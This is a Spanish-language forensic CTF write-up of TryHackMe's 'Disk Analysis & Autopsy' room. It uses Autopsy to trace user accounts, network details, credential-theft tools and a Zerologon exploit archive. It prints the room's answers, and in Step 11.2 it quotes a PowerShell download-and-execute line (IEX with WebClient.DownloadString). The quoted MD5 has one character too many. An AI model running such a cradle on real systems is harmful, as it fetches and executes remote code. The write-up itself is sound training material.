# Writeup: Disk Analysis and Autopsy (TryHackMe)

## Introducción

**Resumen:** Disk Analysis & Autopsy es un desafío forense de dificultad media. Implica analizar una imagen forense de disco en **Autopsy** para determinar qué software malicioso se instaló, por qué usuarios, y descubrir varios otros artefactos.

**Escenario:** La tarea es realizar un análisis manual de los artefactos descubiertos por Autopsy para responder a las preguntas a continuación. Esta sala debería ayudarte a reforzar lo que aprendiste en la sala de Autopsy. ¡Diviértete investigando!

---

## 💻 Paso 1: Apertura del Caso en Autopsy

El primer paso en el análisis forense es abrir el caso existente proporcionado por el CTF dentro de la herramienta **Autopsy 4.18.0**.

1.  Al iniciar **Autopsy**, seleccionamos la opción **"Open Case"** en la pantalla de bienvenida para cargar un caso previamente guardado.

<img width="1070" height="791" alt="Abro la herramiento Autopsy" src="https://github.com/user-attachments/assets/6afcec18-1c1e-4cf7-8d03-d3f051a93a30" />

2.  En la ventana de diálogo **"Open"**, navegamos hasta la ubicación del archivo del caso. Seleccionamos el archivo **`Tryhackme.aut`** (el archivo de caso de Autopsy) ubicado en el directorio `Case Files` y pulsamos **"Open"**.

<img width="1038" height="792" alt="abro el archivo" src="https://github.com/user-attachments/assets/1e22f342-3dde-47cc-b5b2-a46bc3b37648" />

3.  Tras intentar abrir el caso, **Autopsy** muestra una alerta de **"Missing Image"** (Imagen Faltante), indicando que el archivo de imagen de disco original (`HASAN2.E01`) asociado no ha sido encontrado. Para continuar con el análisis de la información ya procesada en el caso sin buscar la imagen en ese momento, seleccionamos **"No"** en la alerta.

    > **Nota:** Al seleccionar "No", el aviso nos indica que podremos seguir navegando por el árbol de directorios y generar informes basados en los datos ya cargados en el caso.

Con esto, el caso **`Tryhackme`** se abre correctamente, y estamos listos para comenzar el análisis.

<img width="1289" height="805" alt="en la alerta seleccion no para analizar el conenido" src="https://github.com/user-attachments/assets/abea6a71-d6e3-4b5e-9ce4-6ae76f5131a8" />

---
## 🔍 Paso 2: Exploración Inicial de la Fuente de Datos

Una vez cargado el caso, realizamos una exploración inicial de la estructura de la imagen de disco forense para entender los datos disponibles.

1.  En el panel izquierdo, bajo el encabezado **"Data Sources"** (Fuentes de Datos), se lista la imagen forense que estamos analizando: **`HASAN2.E01`**.

<img width="1380" height="868" alt="accedemos al menui de la app para ver las carpetas" src="https://github.com/user-attachments/assets/69f9f41c-d330-4fc1-845d-54ac70f72d34" />

3.  Hacemos clic en **`HASAN2.E01`** para ver el listado de particiones y volúmenes detectados en la imagen. La tabla en el panel central muestra la estructura del disco, incluyendo las particiones asignadas (NTFS/exFAT) y las áreas no asignadas (`Unallocated`).

<img width="1369" height="824" alt="vemos estructura de la imagen a analizar" src="https://github.com/user-attachments/assets/708bb60c-987f-4250-b61a-030521399a93" />

4.  Para ver la estructura de directorios y archivos, expandimos el árbol de la fuente de datos `HASAN2.E01` en el panel izquierdo. Observamos una partición principal (vol3/NTFS) que contiene la estructura típica de un sistema operativo Windows, con directorios como:
    * `$Recycle.Bin`
    * `Documents and Settings`
    * `PerfLogs`
    * `Program Files` (x86 y estándar)
    * `ProgramData`
    * `Users`
    * `Windows`

5.  También observamos la sección de **"Results"** (Resultados) en el panel de navegación izquierdo. Esta sección es clave, ya que contiene los artefactos que Autopsy ha extraído y clasificado automáticamente (programas instalados, actividad web, archivos eliminados, etc.). Esta información será fundamental para responder a las preguntas del CTF.

---
## 🕵️ Paso 3: Obtención de Hash MD5 y Búsqueda Inicial

Para documentar y verificar la integridad de la imagen forense, y comenzar la fase de búsqueda de artefactos, realizamos dos acciones iniciales: la obtención del hash MD5 de la imagen y una búsqueda de palabras clave.

### 3.1. Obtención del Hash MD5 de la Imagen

1.  En el panel de navegación izquierdo, dentro de **"Data Sources"**, hacemos clic en la imagen **`HASAN2.E01`**.
2.  En el panel central, navegamos a la pestaña **"Summary"**.
3.  Aquí podemos encontrar metadatos clave de la imagen, incluyendo los valores de hash calculados en el momento de la adquisición. Identificamos el hash MD5:
    * **MD5:** `39b8c51bd0b3b5c1359d949657d8e2079`
    
<img width="1386" height="867" alt="encontrando el md5 del disco" src="https://github.com/user-attachments/assets/d19919b8-2b59-4af0-8873-b4801f6be6d5" />

### 3.2. Búsqueda de Palabras Clave: "secret"

Comenzamos la búsqueda de artefactos relevantes utilizando la función de búsqueda de palabras clave de Autopsy. Una palabra clave común en los CTFs es "secret".

<img width="1375" height="865" alt="hacemos busqueda de palabra clave" src="https://github.com/user-attachments/assets/207f64f7-dfaa-4e54-a267-497315af9c5e" />

1.  En la barra superior de herramientas, seleccionamos la opción **"Keyword Search"** (Búsqueda de Palabras Clave).
2.  En el campo de búsqueda, ingresamos la palabra clave **`secret`**.
3.  Seleccionamos la opción **"Exact Match"** (Coincidencia Exacta) para asegurar una búsqueda precisa.
4.  Pulsamos el botón **"Search"**.

Autopsy buscará la cadena de texto "secret" en todos los archivos y datos indexados del caso, lo cual nos proporcionará los primeros artefactos relevantes para responder a las preguntas del CTF (aunque los resultados aún no se muestran en la captura, el paso de la búsqueda ya ha sido ejecutado).

---
## 🖥️ Paso 4: Determinación del Nombre del Ordenador

Una de las primeras piezas de información que se busca en un análisis forense es el nombre del equipo, ya que es un identificador único en la red.

1.  En el panel de navegación izquierdo, bajo la sección **"Results"** (Resultados), expandimos el árbol de directorios de **"Extracted Content"** (Contenido Extraído).

2.  Dentro de esta categoría, seleccionamos **"Operating System Information"** (Información del Sistema Operativo). Autopsy ha extraído automáticamente esta información de los archivos de registro de Windows (Registry files).

3.  En la tabla de listado en el panel central, podemos ver los detalles del sistema. En la columna **"Name"**, se revela el nombre del ordenador:
    * **Nombre del Ordenador:** `DESKTOP-0R59O3J`
    * 
<img width="1348" height="850" alt="navegando hacia extracted content obtenemos el nombre del ordenador" src="https://github.com/user-attachments/assets/75a2f34c-69bf-4a50-9e41-2e2879244d32" />

---
## 👥 Paso 5: Identificación de Cuentas de Usuario

Para entender el contexto de la actividad en el sistema, es fundamental listar todas las cuentas de usuario creadas, lo que nos puede indicar posibles atacantes o usuarios comprometidos.

<img width="1345" height="860" alt="buscando las cuentas de usuarios" src="https://github.com/user-attachments/assets/1690e1a1-04f4-49d2-8e79-de66e8eae58e" />

1.  En el panel de navegación izquierdo, dentro de **"Results"** (Resultados) y **"Extracted Content"** (Contenido Extraído), seleccionamos la categoría **"Operating System User Account"** (Cuenta de Usuario del Sistema Operativo). Autopsy extrae esta información de la colmena **SAM** (Security Account Manager) del registro de Windows.

2.  En el panel central, la tabla de listado muestra todas las cuentas encontradas en el sistema. Analizando la columna **"Username"**, identificamos las siguientes cuentas de interés, además de las cuentas predeterminadas (`Administrator`, `Guest`, etc.):
    * `HASAN`
    * `nishwa`
    * `keshav`
    * `Sandhya`
    * `shreya`
    * `swapnapriya`
    * `unnix`
    * `suba`

De estas, la cuenta **`HASAN`** (resaltada en la captura) parece ser la principal cuenta de usuario asociada al nombre del disco (`HASAN2.E01`), y las otras son cuentas de usuario estándar del sistema.

---
## 🕵️ Paso 6: Descubrimiento y Análisis de Software Instalado

En este paso, examinamos los programas instalados en el sistema, lo que a menudo revela herramientas de monitoreo o software malicioso.

### 6.1. Identificación del Software Instalado

1.  Navegamos en el panel izquierdo a **"Results"** $\rightarrow$ **"Extracted Content"** $\rightarrow$ **"Installed Programs"** (Programas Instalados).
2.  Revisando la lista de programas, identificamos una aplicación que podría ser una herramienta de monitoreo o administración de red: **`Look@LAN 2.50 Build 35`**.
3.  Registramos la fecha y hora de instalación o la última modificación asociada a este software: **`2021-02-07 10:49:21 EST`**.

<img width="1384" height="851" alt="econtramos una app de monitorizazcion de red" src="https://github.com/user-attachments/assets/56f4116d-2adf-43b2-b485-0907c41e0a65" />

### 6.2. Extracción de Información de Configuración

Para obtener más detalles sobre el uso de este programa, buscamos su directorio de instalación y archivos de configuración:

1.  Navegamos en el árbol de directorios a la ruta donde se encuentra el programa: **`\vol3\Program Files (x86)\Look@LAN`**.
2.  Localizamos el archivo de configuración **`irunin.ini`** dentro de este directorio.
3.  Hacemos clic en el archivo y revisamos su contenido utilizando la pestaña **"File Text"** (Texto del Archivo) en el panel inferior.
4.  Al examinar el contenido de `irunin.ini`, encontramos una dirección IP registrada bajo una sección de configuración:
    * **Dirección IP de Interés:** `192.168.100.21`

<img width="1366" height="792" alt="buscamos el directorio de la app y encontramos la ip" src="https://github.com/user-attachments/assets/2dfad851-9d7e-48ea-b3d0-753037563f5d" />

Esta dirección IP probablemente está relacionada con un sistema o servidor que el usuario `HASAN` estaba monitoreando o al que se conectó usando la herramienta `Look@LAN`.

---
## 🌐 Paso 7: Extracción de la Dirección MAC

Aprovechando que ya estamos en el directorio de configuración de la aplicación **`Look@LAN`**, examinamos el mismo archivo de configuración para buscar otros identificadores de red.

1.  Continuando en la ruta **`\vol3\Program Files (x86)\Look@LAN`** y con el archivo **`irunin.ini`** seleccionado.

2.  Revisamos el contenido del archivo en el panel inferior, específicamente buscando variables de red.

3.  Justo después de la IP de interés que encontramos en el paso anterior (`LANIP=192.168.100.21`), encontramos la dirección MAC asociada al sistema o dispositivo monitoreado:
    * **Dirección MAC:** `000072CE4B89`

<img width="1344" height="852" alt="en la misma ruta que la ip esta la mac" src="https://github.com/user-attachments/assets/1fb1f81c-0772-40fb-93de-6416d7bf9b32" />

Este artefacto proporciona una pieza más del rompecabezas sobre el entorno de red del sistema comprometido.

---
## 📡 Paso 8: Identificación del Adaptador de Red (NIC)

Para tener una visión completa del hardware de red del sistema, buscamos información sobre el adaptador de red, que usualmente se encuentra en los archivos de registro del sistema.

1.  La captura de pantalla sugiere que se ha realizado una **búsqueda de palabras clave** o una navegación a través de artefactos extraídos de los *Registry Files* (Archivos de Registro).
2.  Al examinar el *Keyword Preview* (Vista Previa de Palabras Clave) y los resultados de la búsqueda, identificamos una ruta que contiene información sobre un adaptador de red:
    * **Ruta de la clave de Registro:** `System32\config\DispName\%ImagePath%=Intel(R) PRO/1000k NDIS 6 Adapter Driver`
3.  El texto extraído de los registros revela el nombre del adaptador de red instalado en el sistema:
    * **Nombre del Adaptador de Red:** `Intel(R) PRO/1000k NDIS 6 Adapter Driver`

<img width="1380" height="857" alt="bucando por arhicvos encontramos la tarjeta de red" src="https://github.com/user-attachments/assets/c5d71c3f-5f27-400f-86e6-68d07fd1b042" />

Este descubrimiento confirma el tipo de hardware de red que se estaba utilizando en el equipo analizado.

---
## 📍 Paso 9: Descubrimiento de la Ubicación Geográfica

Una práctica común es examinar los marcadores web (Web Bookmarks), ya que a menudo contienen URLs a lugares o direcciones de interés para el usuario.

1.  En el panel de navegación izquierdo, dentro de la sección **"Results"** $\rightarrow$ **"Extracted Content"**, seleccionamos **"Web Bookmarks"** (Marcadores Web).

2.  Revisamos la lista de URLs guardadas. Encontramos un marcador que apunta directamente a una ubicación en Google Maps:
    * **URL de Maps:** `https://www.google.com/maps/place/12%C2%B052'23.0%22N+80%C2%B013'25.0%22E/@12.8730022,80.2229713,17z/data=...`

3.  Al examinar el *Bookmark Details* (Detalles del Marcador) en el panel inferior, identificamos el título y las coordenadas guardadas:
    * **Título:** `12°52'23.0"N 80°13'25.0"E - Google Maps`
    * **Coordenadas:** $12.8730022, 80.223611$ (aproximadamente, indicando Latitud y Longitud)

<img width="1372" height="858" alt="ubicacione en google maps" src="https://github.com/user-attachments/assets/62c67cef-8840-44f6-90c0-603b18936313" />

Esta ubicación geográfica representa un lugar que el usuario ha marcado, y su análisis en un mapa (una universidad en Sathyabama, India, según el título visible de otro marcador) es probablemente la respuesta a una de las preguntas del CTF.

---
## 🖼️ Paso 10: Identificación de un Usuario Adicional a Través de Imágenes

Para identificar a todos los usuarios que han estado activos en el sistema, exploramos los archivos multimedia asociados a las carpetas de usuario.

1.  Hacemos clic en **"Images/Videos"** en la barra de herramientas superior para acceder al **Image/Video Gallery Editor** de Autopsy.
2.  Navegamos a las carpetas de usuario (`Users`) dentro del volumen `vol3`.
3.  Expandimos el árbol de directorios para ver los archivos en las carpetas de usuario, y notamos una carpeta de descargas (`Downloads`) para un usuario que no estaba listado explícitamente en el **Paso 5**:
    * **Nombre de Usuario Adicional:** `joshuva`

4.  Dentro de la carpeta `joshuva/Downloads`, encontramos una imagen, en este caso, un fondo de pantalla (`cyberpunk-2077-samurai-jacket-yo-1360x768.jpg`).

<img width="1004" height="726" alt="USuario que tiene su nombre completo en wallapper" src="https://github.com/user-attachments/assets/95a00361-438c-45f5-b775-bdc1dc7d188e" />

La existencia de esta carpeta y archivos confirma que el usuario **`joshuva`** ha utilizado el sistema, y su nombre completo puede ser la respuesta a una de las preguntas del CTF.

---
## 🚩 Paso 11: Descubrimiento de las Banderas (Flags) y Análisis de la Actividad Maliciosa

Para encontrar las respuestas principales del CTF, investigamos los historiales de comandos y las carpetas de usuario en busca de archivos que contengan la "flag" (bandera) y evidencia de actividad maliciosa.

### 11.1. Análisis del Historial de PowerShell de Shreya

1.  Navegamos a la carpeta de la usuaria **`shreya`** y a la ruta de **PowerShell**: `Users\shreya\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`.
2.  Abrimos el archivo **`ConsoleHost_history.txt`**, que registra los comandos ejecutados en PowerShell.
3.  Observamos los comandos `Add-Content` utilizados para escribir una bandera en un archivo:
    * El comando final ejecutado es: `Add-Content .\shreya.txt "flag{HarleyQuinnForQueen}"`
    * **Bandera Modificada por Shreya:** `flag{HarleyQuinnForQueen}`
  
<img width="1356" height="844" alt="que bandera cambio la usuaria" src="https://github.com/user-attachments/assets/a93a99dc-f221-400b-8cd9-c6bd52472179" />

### 11.2. Análisis del Script de Exploit de Hasan

1.  Navegamos al escritorio del usuario **`HASAN`**: `Users\HASAN\Desktop`.
2.  Encontramos un archivo sospechoso llamado **`exploit.ps1`**, que indica un script de PowerShell malicioso.
3.  Revisamos el contenido del script. El script parece ser un *payload* de ataque, y contiene el siguiente código:

    ```powershell
    Add-Content C:\Users\HASAN\Desktop\hacked.txt 'Flag{I-hacked-you}'
    ```

4.  Este comando escribe un mensaje de "hacked" (hackeado) en un archivo de texto en el escritorio de `HASAN`. El mensaje de la bandera (flag) que fue dejado es:
    * **Mensaje de la Bandera del Exploit:** `Flag{I-hacked-you}`

5.  El script también incluye código para descargar contenido de YouTube (`https://youtu.be/C9GJFFhjHXI`) y parece contener código de **reverse shell** (`IEX (New-Object System.Net.WebClient).DownloadString('http://...`)`, lo que confirma que el propósito principal del archivo era realizar un ataque.

<img width="1373" height="847" alt="exploit del usuario que mensaje" src="https://github.com/user-attachments/assets/cbd27469-bebe-4803-aa66-35534c73ff2d" />

---
## 🔨 Paso 12: Descubrimiento de Herramientas de Hacking de Contraseñas

La detección de herramientas conocidas para el robo o descifrado de contraseñas es una evidencia sólida de intención maliciosa en el sistema.

### 12.1. Herramientas de Hacking en la Carpeta de Descargas

1.  Navegamos a la carpeta de descargas del usuario **`HASAN`**: `Users\HASAN\Downloads`.
2.  Encontramos dos archivos clave que indican la presencia de una popular herramienta de volcado de credenciales de Windows:
    * **Archivos Encontrados:**
        * `mimikatz.zip`
        * `mimikatz_trunk.zip`
3.  Esta es una evidencia directa de que el atacante (o el usuario `HASAN`) estaba usando o planeaba usar **Mimikatz** para robar credenciales.

<img width="1395" height="843" alt="que herramietnas de hackeo de pass" src="https://github.com/user-attachments/assets/ed5c4576-ade8-4454-b524-0208b1e2b3e4" />

### 12.2. Detección de Archivos Maliciosos por Windows Defender

1.  Para buscar más evidencia, examinamos los registros de detección del software antivirus. Navegamos a la ruta de historial de servicio de Windows Defender:
    * **Ruta:** `\vol3\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory`

2.  Revisamos los registros de detección y encontramos una entrada que muestra que Windows Defender identificó una herramienta maliciosa:
    * **Archivo Detectado:** `lazagne.exe`
    * **Ruta de la Detección:** `C:\Users\HASAN\Downloads\lazagne.exe`
    * **Clasificación:** `HackTool:Win32/LaZagne`

3.  El hallazgo confirma que otra herramienta de *hacking* de contraseñas, **LaZagne**, fue descargada por el usuario `HASAN` y detectada por el antivirus.

<img width="1325" height="850" alt="otra herramienta de hackeo de pass" src="https://github.com/user-attachments/assets/604c3ea0-34ae-467d-91c5-43acf4b7a1ba" />

Ambos hallazgos demuestran la clara intención del usuario `HASAN` de comprometer credenciales en el sistema o la red.

---
## 🔎 Paso 13: Búsqueda de Archivos de Reglas YARA

Para una confirmación forense, se buscan archivos de reglas YARA, que son utilizados para identificar patrones de software malicioso. Estos archivos a menudo se encuentran junto a las herramientas de análisis.

1.  Se utiliza la función de búsqueda de Autopsy para localizar archivos con la extensión `.yar`.
2.  Encontramos el archivo **`kiwi_passwords.yar`** en la lista de resultados. La presencia de este archivo sugiere que el sistema fue examinado previamente o que se almacenó una regla específica para detectar la herramienta Mimikatz.
3.  Al revisar el contenido del archivo `.yar` en el panel inferior, confirmamos que la regla está diseñada para detectar **Mimikatz**:
    * **Autor de la Regla:** `Benjamin DELPY (gentilkiwi)` (el creador de Mimikatz).
    * **Descripción:** La regla está etiquetada como `rule mimikatz`, lo que confirma su propósito.

<img width="1365" height="849" alt="busqueda d archivo yar usando la hta busqueda por atributo" src="https://github.com/user-attachments/assets/6610ad04-619d-412e-9c10-406eb308fd5f" />

Este paso refuerza la evidencia del **Paso 12**, confirmando la intención del usuario de utilizar herramientas de volcado de credenciales como Mimikatz.

---
## 📁 Paso 14: Descubrimiento del Nombre Final del Exploit

Para identificar el nombre exacto del archivo utilizado para el exploit, analizamos los enlaces de archivos recientes del sistema, los cuales son un gran indicador de la actividad del usuario.

1.  Navegamos a los artefactos extraídos de la actividad reciente del sistema operativo, concretamente a los archivos **"Recent"** del usuario **`sandhya`** (la captura se enfoca en su carpeta `AppData`).
2.  La captura sugiere que se realizó una búsqueda de palabras clave como **MSNRPC** para filtrar la actividad.
3.  Dentro de la ruta `Users\sandhya\AppData\Roaming\Microsoft\Windows\Recent`, encontramos un archivo `.lnk` (acceso directo) que apunta a un archivo comprimido de interés:
    * **Archivo `.lnk`:** `2.2.0 20200918 zerologon encrypted.lnk`
4.  Al analizar el contenido del archivo `.lnk` en el panel inferior (vía la pestaña **"File Text"**), se revela la ruta completa del archivo de exploit descargado:
    * **Nombre del Exploit Final:** `2.2.0 20200918 Zerologon encrypted.zip`

<img width="1384" height="856" alt="nombre del arhcivo del explot MSNRPC" src="https://github.com/user-attachments/assets/de753021-c34c-4559-97f7-51fa7a9709bf" />

Este archivo, presumiblemente, contiene un exploit para **Zerologon**, lo que solidifica aún más la naturaleza maliciosa de la actividad en el sistema.

---
## 📝 Paso 15 y Final: Confirmación del Archivo de Exploit a Través de Documentos Recientes

Para finalizar la identificación de artefactos, confirmamos la actividad de descarga del exploit analizando el listado general de documentos recientes.

1.  Navegamos en el panel izquierdo a la categoría de artefactos **"Recent Documents"** (Documentos Recientes), dentro de **"Extracted Content"**.
2.  El listado en el panel central muestra todos los archivos accedidos o modificados recientemente por los usuarios.
3.  Al revisar la lista, encontramos una entrada que corrobora el hallazgo del **Paso 14**:
    * **Ruta de la Descarga:** `C:\Users\sandhya\Downloads\2.2.0 20200918 zerologon encrypted.zip`
    * **Nombre del Exploit Final:** `2.2.0 20200918 zerologon encrypted.zip`

<img width="1325" height="836" alt="arhicvo encontrado en recent documents" src="https://github.com/user-attachments/assets/b75d25f3-b126-418c-965e-db72060c03cd" />

Este paso final proporciona la ubicación y el nombre completo del archivo que se utilizó para el exploit de Zerologon, concluyendo el análisis de los artefactos críticos necesarios para resolver el CTF.

---
